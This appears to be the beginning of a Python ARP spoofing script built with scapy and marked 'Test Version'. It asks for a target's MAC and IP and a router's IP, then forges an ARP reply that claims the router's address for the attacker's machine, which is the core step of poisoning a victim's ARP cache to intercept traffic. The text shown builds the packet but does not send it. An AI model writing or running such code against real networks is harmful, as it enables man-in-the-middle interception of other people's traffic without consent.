import scapy.all as scapy
"""    Test Version     """
target_mac = str(input("target_mac >>> "))
target_ip = str(input("target_ip >>> "))
route_ip = str(input("route_ip >>> "))

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)